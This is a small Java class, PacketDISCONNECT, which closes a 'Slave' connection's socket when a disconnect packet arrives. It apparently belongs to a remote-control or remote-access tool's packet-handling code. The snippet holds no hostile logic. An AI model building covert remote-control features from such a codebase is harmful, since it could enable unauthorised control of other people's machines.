package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;

public class PacketDISCONNECT extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		slave.closeSocket(new CloseException("Disconnect packet"));
	}

}
